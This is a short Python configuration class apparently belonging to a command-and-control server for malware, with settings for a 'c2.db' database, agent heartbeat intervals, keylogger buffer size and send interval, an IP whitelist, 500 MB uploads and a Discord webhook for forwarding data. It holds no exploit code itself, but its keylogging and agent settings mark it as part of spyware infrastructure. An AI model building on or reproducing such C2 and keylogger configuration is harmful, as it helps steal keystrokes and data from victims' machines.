import os
from dotenv import load_dotenv

load_dotenv()

class Config:
    SECRET_KEY = os.environ.get('SECRET_KEY', os.urandom(32).hex())
    SQLALCHEMY_DATABASE_URI = os.environ.get('DATABASE_URL', 'sqlite:///c2.db')
    SQLALCHEMY_TRACK_MODIFICATIONS = False
    SESSION_COOKIE_HTTPONLY = True
    SESSION_COOKIE_SECURE = os.environ.get('SESSION_COOKIE_SECURE', 'False').lower() == 'true'
    SESSION_COOKIE_SAMESITE = 'Lax'
    PERMANENT_SESSION_LIFETIME = 3600  # 1 hour
    IP_WHITELIST = [ip.strip() for ip in os.environ.get('IP_WHITELIST', '').split(',') if ip.strip()]
    MAX_UPLOAD_SIZE = 500 * 1024 * 1024  # 500 MB
    AGENT_HEARTBEAT_INTERVAL = 30  # seconds
    KEYLOG_BUFFER_SIZE = 4096  # characters before flush
    KEYLOG_SEND_INTERVAL = 60  # seconds
    DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK_URL', '')
    PORT = int(os.environ.get('PORT', 33875))